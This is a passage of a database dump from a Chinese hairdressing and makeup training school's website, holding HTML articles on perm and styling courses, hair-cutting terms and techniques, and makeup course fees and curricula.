热能烫；空气灵感烫绒绳烫；香薰烫、火焰烫、波感烫，理疗弹性烫等。三维立体烫等多项烫发技术。更有流行日式梨花剪烫、水泼纹等潮流商业造型讲解，及烫前烫后护理技术，百变风格系多款个性化精髓演绎。</span></p><p><span style=\"font-size: 18px;\"><font face=\"微软雅黑, Microsoft YaHei\"><br/></font></span></p><p><span style=\"font-size: 18px;\"></span></p><p style=\"text-align:center\"><span style=\"font-family:微软雅黑, Microsoft YaHei\"><img src=\"/uploads/allimg/20190304/1551707621871899.jpg\" title=\"1551707621871899.jpg\" alt=\"美发.03.jpg\"/></span></p><p><span style=\"font-family:微软雅黑, Microsoft YaHei\"><br/></span></p><p><span style=\"font-size: 18px;\"><font face=\"微软雅黑, Microsoft YaHei\">发廊实战 &nbsp; 发廊管理课程、营销课程、顾客沟通课程</font><br style=\"color: rgb(0, 0, 0); font-family: &#39;sans serif&#39;, tahoma, verdana, helvetica; line-height: 18px;\"/><br style=\"color: rgb(0, 0, 0); font-family: &#39;sans serif&#39;, tahoma, verdana, helvetica; line-height: 18px;\"/><font face=\"微软雅黑, Microsoft YaHei\">简约时尚造型：教授简约而时尚快捷的造型装扮技巧，直发，曲发变化造型，烫发后生活靓妆造型，各种发夹，发饰，饰花的搭配，脸型的分析，出席不同场合，不同服饰的晚装要领。包括现在所有流行的韩式造型方法，利用吹恤技巧与手法的结合，创造出各种华贵，自然之个性造型，包括如何打造头部的饱满度，制造发根定位，利用内包效果打造精致小脸型，各种梳子的使用技巧以及徒手造型等。饰发产品打理造型技巧，认识形体，电夹板、电卷棒造型技巧，针对各种脸型、发质、发长和客人的气质深度挖掘客人的美等各式技术手法全方面提升发型师的造型美感和能力</font></span><br/></p>','','','219.147.98.86'),(9,10,'<img alt=\"\" src=\"/uploads/allimg/190221/1-1Z221202S11G-lp.jpg\" style=\"width: 240px; height: 159px;\" />','','','36.102.4.97'),(10,10,'<p style=\"text-align: center;\"><img src=\"/uploads/allimg/20190306/1551880248851152.jpg\" style=\"\" title=\"1551880248851152.jpg\"/></p><p><br/></p><p style=\"text-align: center;\"><img src=\"/uploads/allimg/20190306/1551880248265822.jpg\" style=\"\" title=\"1551880248265822.jpg\"/></p><p><br/></p><p style=\"text-align: center;\"><br/></p><p><br/></p>','','','219.147.98.86'),(11,11,'<p><span style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\">&nbsp; &nbsp; 如何快速提高发型修剪的水平，是每个初学者最关心的话题。为了帮助大家尽快学习和掌握发型修剪技术，提高剪发的速度以及剪发的准确度，以下是一套简单易学的剪发技巧，希望对大家学习有所帮助。</span><br style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\"/><span style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\">　　一、头部的标准点位：</span><br style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\"/><span style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\">　　从人体头面部骨骼结构以及五官比例和头发的分布上，可以分为若干个点，称为点位。点位在发型设计中起定位作用、划分区域的作用、确定剪发区位的作用。</span><br style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\"/><span style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\">　　1、衔接点：中心点、额点、耳点、后颈点。</span><br style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\"/><span style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\">　　2、过度点：鬓角点、颈侧点。</span><br style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\"/><span style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\">　　3、转角点：顶点、黄金点（GP点）、后脑点。</span><br style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\"/><span style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\">　　4、基准点：中心基准点、顶部基准点、黄金基准点、后颈基准点。</span><br style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\"/><span style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\">　　这些点位构成了发型层次结构的基本框架，剪发时如能准确掌握点位的位置，了解每一个点位在发型中的作用，便可随心所欲的尽情发挥了。</span></p><p style=\"text-align:center\"><img src=\"/uploads/allimg/20190303/1551601052794663.jpg\" title=\"1551601052794663.jpg\" alt=\"1.jpg\"/></p><p><span style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\">　　二、剪法技巧中的专业术语：</span><br style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\"/><span style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\">　　1、断剪：用剪刀将头发整齐的剪断。从操作上可分为：梳压断剪法；手指夹断剪法；悬空断剪法。</span><br style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\"/><span style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\">　　2、刻痕剪：用剪刀尖将发尾剪成锯齿状参差不齐效果的方式。</span><br style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\"/><span style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\">　　浅刻痕剪：用刻痕剪将头发剪短或锯齿状修剪的方式。</span><br style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\"/><span style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\">　　深刻痕剪：用剪刀尖对发尾进行深度处理，使发尾的密度减轻，流向得到有效的控制。</span><br style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\"/><span style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\">　　3、飞剪：剪刀快速修剪头发的方式。操作形式是多样化的，具体如下：</span><br style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\"/><span style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\">　　点断式飞剪：缔造参差不齐的发尾效果，剪短头发的长度。</span><br style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\"/><span style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\">　　逆式飞剪：减轻发尾的密度，缔造透气感效果。</span><br style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\"/><span style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\">　　4、滑剪：用剪刀轻微张开，从发束上滑过，使发尾产生轻柔飘顺的条状效果。</span><br style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\"/><span style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\">　　上挑式滑剪：将发片或发束提升至叫高的角度，从内侧向上滑剪，使发片的内侧产生轻薄的感觉。</span><br style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\"/><span style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\">　　下滑式滑剪：对发束的表面进行处理，使发尾产生轻而尖的效果。</span><br style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\"/><span style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\">　　扭式滑剪：将发束扭成绳状，进行下滑剪，可使发尾产生笔尖状的效果。</span><br style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\"/><span style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\">　　8字滑剪：使发尾产生方向的改变，可分为：正手8字滑剪与反手8字滑剪。</span><br style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\"/><span style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\">　　5、托剪：用梳子将头发托起来修剪的方式，多用于修饰衔接短发重量线。</span><br style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\"/><span style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\">　　6、推剪：用梳子贴着头皮修剪较短的部位。</span><br style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\"/><span style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\">　　7、点剪：用剪刀在发片上间隔点剪，缔造透空感效果。</span><br style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\"/><span style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\">　　8、悬空剪：不借助梳子或手指进行剪发的方式。</span><br style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\"/><span style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\">　　9、间隔挑剪：用剪刀在发片上间隔挑起若干分头发进行修剪的方式。</span><br/></p>','','','219.147.98.86'),(12,11,'<p><span style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\">　第一，工具的使用要熟练</span><br style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\"/><span style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\">　　新手学理发基本步骤的第一步就是要掌握如何使用工具，其中包括了、吹、剪、烫等所用到的工具。这其中，以剪头发为重要的一个环节，需要从如何拿工具到所使用的手法开始学习。比如使用剪刀时要注意刀与头发保持斜形去剪，不能平行的剪。还有，吹风机如何吹会更有利等这些问题也是最先要了解的。</span></p><p style=\"text-align:center\"><img src=\"/uploads/allimg/20190303/1551600550329987.jpg\" title=\"1551600550329987.jpg\" alt=\"1 (5).jpg\"/></p><p><span style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\">　　第二，要掌握各种剪法</span><br style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\"/><span style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\">　　新手学理发基本步骤中，各种各样的剪法是需要学员去学习的。在学习剪头发的最初阶段是要学习挑剪的，但一定要正确掌握挑起头发的角度，要按头部的弧形轮廓来挑剪，但一定不能平直的进行，容易出楞角就破坏了发型。除了挑剪，削剪也是在理发过程中经常用到的。</span><br style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\"/><span style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\">　　第三，学习烫发</span><br style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\"/><span style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\">　　新手学理发基本步骤有哪些呢？除了吹剪还有比较重要的烫发以及染色，不同的人适合不同大小的烫花，而如今各种各样的烫发也是新手们需要付出努力去学习的。在学习中，先要把头发剪出形状，再为客户设计花型，最后上卷。当然，有经验的理发师一眼就能看出什么脸型适合什么样的发型，这一点是需要多年理发习惯才能培养出的。</span><br/></p>','','','219.147.98.86'),(13,11,'<p><span style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\">　美发师剪发小技巧 &nbsp;夹剪的操作技巧主要有以下几点</span><br style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\"/><span style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\">　　①夹剪时手指夹住头发的部位，确定留发的长度。</span><br style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\"/><span style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\">　　②夹起的每股头发要平直，夹剪的每股头发要注意相互衔接，即要注意夹起每股头发的角度，避免脱节。</span><br style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\"/><span style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\">　　③要了解剪发角度与层次的关系。层次是指头发有次序的排列，其发梢呈一定的坡度，它是发型结构中的重要组成部分。修剪头发的角度与层次有密切关系。一般平形分片夹剪，形成低层次或一层次（又称无层次或齐叠层次），而垂直形分片夹剪则形成高层次。不同部位不同角度的修剪形成不同的层次。 顶部头发不同角度夹剪形成不同的层次。顶部头发向上垂直形分片水平形修剪，则形成层次比较适中；如向上修剪则形成低层次；向下修剪则形成高层次。 侧部徨部头发向侧面垂直地分片简便剪，不同角度形成不同层次。按90度角垂直地修剪，层次比较适中；按45度角向上斜剪，则形成高层次；按45度角向斜剪，则层次低或齐叠层次(一层次)。</span></p><p style=\"text-align:center\"><img src=\"/uploads/allimg/20190303/1551599376697821.jpg\" title=\"1551599376697821.jpg\" alt=\"微信截图_20190302220852.jpg\"/></p><p><span style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\">　　抓剪的操作技巧主要有以下几点：</span><br style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\"/><span style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\">　　①抓起头发基部的宽度大小，决定剪发后形成弧度大小。一般说抓起头发的基部大，剪后弧度大，反之，基部小，剪后弧度小。</span><br style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\"/><span style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\">　　②抓剪时不同部位的抓剪，形成不同的弧度。向上、向后、向前的抓发方向不同，也会产生不同的弧度。</span><br style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\"/><span style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\">　　③抓起头发后剪刀落刀的部位要适中，不要过高或过低，这会影响头发的长度和所形成的弧度。</span><br style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\"/><span style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\">　　挑剪的操作技巧有以下几点：</span><br style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\"/><span style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\">　　①挑剪时剪刀与梳子要密切结合。梳子挑起一股头发用剪刀剪去露在梳齿外的过长头发，梳一股剪，梳子起引导作用。剪发时剪刀的不动刀刃应与梳子背保持平行，这样容易剪得平齐。</span><br style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\"/><span style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\">　　②要正确掌握挑起头发的角度。一般讲，挑起头发的角度大则层次高，挑起头发的角度小则层次低.</span><br style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\"/><span style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\">　　③挑起的头发应与头部弧形轮廓相适应。挑剪时应按头部弧形轮廓挑剪，不能平直地剪，这样容易剪出楞角。挑剪的头发不宜过多，要注意上下前后头发的衔接，不能有脱节现象。</span><br style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\"/><span style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\">　　锯齿剪的操作技巧有以下几点：</span><br style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\"/><span style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\">　　①主要是剪刀与头发保持斜形地向上或向下剪发，不能平行地剪，而要斜形移动地剪，这样不会形成重叠，影响头发层次。</span><br style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\"/><span style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\">　　②锯齿的部位要事先考虑好，做到心中有数。一般说头发厚的部位要多剪，头发少的部位，特别是短发和头路两侧要少剪。</span><br style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\"/><span style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\">　　剪刀削发操作技巧有以下几点：</span><br style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\"/><span style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\">　　①剪刀削发时，剪刀刀刃要略为张开，将手指夹住的头发放在两片刀刃中，刀刃略带斜角，用刀刃在头发上滑动，将头发削（切）断。削剪时手腕用力恰当，过重头发削去过多，过小则削不下头发。</span><br style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\"/><span style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\">　　②削剪时手指夹住头发，要保持一定张力，便于把头发削下。</span><br style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\"/><span style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\">　　③削剪时要掌握剪刀刀刃在头发上滑动的幅度，一般讲角度大笔尖形小、角度小笔尖形大。</span><br style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\"/><span style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\">　　削刀的操作技巧有以下几点：</span><br style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\"/><span style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\">　　①削刀削发要掌握削刀与头发的角度，一般以20。至45。角之间为宜，角度大笔尖形小，角度小笔尖形大，角度过小，头发容易翻翘，同时也损伤头发。</span><br style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\"/><span style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\">　　②削刀在头发上滑动幅度，决定削去头发的多少和层次的高低。削刀滑动的幅度大削去头发多，形成的层次高；削刀滑动的幅度小削去的头发少，形成的层次低。</span><br style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\"/><span style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\">　　③削刀削发时，手腕关节灵活，用力适当，削出的头发比较柔和。</span><br style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\"/><span style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\">　　修剪的操作程序 发式造型主要是通过修剪来完成的，现代发型更讲究精细而完美修剪。修剪要根据发式要求、头发长短、发量多少、轮廓形状、层次结构、发梢流向等要求进行。 修剪操作一般可分为修剪轮廓、调整层次和厚薄、修饰定型等三道程序。修剪前为了便于精确地修剪，一般要把全部头发分为几个部分，然后分别分层进行修剪。</span><br style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\"/><span style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\">　　头发分部有四分法、五分法、七分法等多种，根据发式修剪具体要求而定。头发分部后要用大的发夹夹住，然后分部分片进行修剪。</span><br style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\"/><span style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\">　　修剪轮廓 将头发梳通顺，根据发式要求将全部头发分为几个部（区），用大发夹（鸭嘴夹）将各部头发夹住，然后分部分层进行剪发。一般讲修剪程序从后颈部开始，剪向两侧及头顶部，最后修剪额前部分头发（刘海）；也可从两侧剪向后部，修剪出发式的初步轮廓。 修剪后颈部及两侧部头发。先在后颈部将头发剪出一个长短和平齐的标准线（或称引导线），然后将后部头发由下而上分层放下，按标准线剪齐，剪同后部的发式轮廓线。再以此轮廓线引向两侧，剪出两侧的标准线，然后按剪后颈部头发的方法，由下而分层按标准线剪出两侧的发式轮廓线。也可从两侧剪向后部，或从一侧剪向另一侧。不论哪一种剪法，都要求剪出的发型轮廓线，前后要衔接。 修剪顶部头发。</span><br style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\"/><span style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\">　　将全部头发向四周梳下，顶部头发也向四周披下，梳齐后按发式轮廓线剪齐。这样全部头发披下后，整个发式轮廓线比较整齐。 修剪额前部分头发。先将额前部分头发挑出一部发分，形成一个逆三角形状，其宽度根据需要而定。一般讲童花式剪成平直形或弧形，然后根据童花要求修剪成齐密、稀疏或参差；刘海式剪削成一个斜角形或平直的稀疏形；单花式则按单花部位剪削一角斜面，双花式则在双花部位各剪削出一个对等的斜面。通过以上步骤，发式初步轮廓已经完成。 调整层次和厚薄 有了以上基础再根据发式要求，用夹剪、挑剪、削薄或锯剪来调整发型轮廓层次结构，如高层次或低层次，发梢内卷要内层次、发梢外翘要外层次，波浪式则发式轮廓处层次不能太大，否则头发容易翻翘。此外结合调整层次，也要剪或削去头发过厚部，使其厚薄适度匀称，没有厚薄不均现象，使整个发式轮廓更为完美。 修饰定型 是检查修饰性工序。将全部头发反复梳理，检查那些不够完善部分，加以修饰，使发式修剪符合要求，在完美的基础上定型。 整个修剪的程序，简单地说就是先用夹剪或挑剪法，按发式要求剪出一个发式的轮廓；然后用夹剪、挑剪、锯剪等方法，调整头发层次结构和剪去过厚部位头发，使轮廓更为完美；最后作检查性的修饰定型。</span><br/></p><p><span style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\"><br/></span></p><p><span style=\"color: rgb(0, 0, 0); font-family: &#39;Microsoft YaHei&#39;; font-size: 16px; line-height: 33px;\"><br/></span></p>','','','219.147.98.86'),(14,9,'<p style=\"text-align: center;\"><img src=\"/uploads/allimg/20190306/1551878853649044.jpg\" style=\"\" title=\"1551878853649044.jpg\"/></p><p><br/></p><p style=\"text-align: center;\"><img src=\"/uploads/allimg/20190306/1551878853274467.jpg\" style=\"\" title=\"1551878853274467.jpg\"/></p><p><br/></p>','','','219.147.98.86'),(15,9,'<p style=\"text-align: center;\"><img src=\"/uploads/allimg/20190306/1551878742460904.jpg\" style=\"\" title=\"1551878742460904.jpg\"/></p><p><br/></p><p style=\"text-align: center;\"><img src=\"/uploads/allimg/20190306/1551878742330518.jpg\" style=\"\" title=\"1551878742330518.jpg\"/></p><p><br/></p>','','','219.147.98.86'),(16,14,'<p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">&nbsp; &nbsp; &nbsp; &nbsp;学费是2880元，45天时间，新娘妆，写真妆，婚纱套系，古妆套系等等二十款妆面。</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\"><br/></span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">&nbsp; &nbsp; &nbsp; &nbsp;课程介绍：<br/></span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">&nbsp; &nbsp; &nbsp; &nbsp;通过对日常生活所需妆面进行细致讲解，教授更加流行的生活时尚妆容技巧。从五官分解的美学观点进行剖析的基础上，对修饰美容化妆、生活妆、职业妆、约会妆，名媛妆、时尚party妆等方面的化妆知识进行全方位传授。</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\"><br/></span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">&nbsp; &nbsp; &nbsp; &nbsp;培养目标：</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">&nbsp; &nbsp; &nbsp; &nbsp;自我化妆设计、训练国际标准职业素养以及良好的职业道德，掌握化妆的基础技能和相关的理论知识，能够根据个人特点并按照生活中所遇到的不同场合进行妆容设计并能够熟练操作，为下一阶段学习打下良好的基础</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">&nbsp; &nbsp; &nbsp;</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">&nbsp; &nbsp; &nbsp; &nbsp;就业方向：自我化妆设计、化妆品专柜化妆师等</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\"><br/></span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\"></span></p><p style=\"text-align:center\"><img src=\"/uploads/allimg/20190304/1551706328536726.jpg\" title=\"1551706328536726.jpg\" alt=\"化妆00.jpg\"/></p><p><br/></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">&nbsp; &nbsp; &nbsp; 美学基础：专业化妆品的认识、选择、保管，专业化妆工具的应用、化妆色彩学、素描与美学、艺术面部解剖学<br/></span></p><p><br/></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">&nbsp; &nbsp; &nbsp; 完美化妆：修眉技巧、画眉技巧、眉形的选择、眼线的描画技巧、眼影的晕染技巧、睫毛的修饰技巧、立体鼻形的修饰技巧、不同腮红的涂抹方法、唇线的描画方法、唇膏的涂抹方法、、各种脸型的化妆方法。&nbsp;</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">&nbsp;</span></p><p><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 16px;\">&nbsp; &nbsp; &nbsp; &nbsp;生活化妆：生活日妆、甜美粉领妆、精致白领妆、时尚party妆、性感暖妆、神秘冷妆、喜庆中式新娘妆、个性西式新娘妆、新郎妆</span></p><p><br/><br/></p>','','','103.219.184.67'),(17,14,'<p><span style=\"font-size: 20px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;\">学期：四个月<br style=\"color: rgb(0, 0, 0); font-family: &#39;sans serif&#39;, tahoma, verdana, helvetica; line-height: 